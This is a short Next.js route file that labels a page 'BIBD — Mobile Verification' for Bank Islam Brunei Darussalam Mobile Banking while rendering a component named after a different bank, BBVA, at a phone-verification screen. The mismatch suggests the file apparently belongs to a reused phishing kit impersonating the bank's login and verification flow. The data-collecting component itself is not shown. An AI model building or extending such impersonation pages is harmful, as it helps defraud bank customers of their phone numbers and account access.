import BbvaPage from "../page"

export const metadata = {
  title: "BIBD — Mobile Verification",
  description: "Bank Islam Brunei Darussalam Mobile Banking",
}

export default function PhoneRoutePage() {
  return <BbvaPage initialScreen="phone" />
}

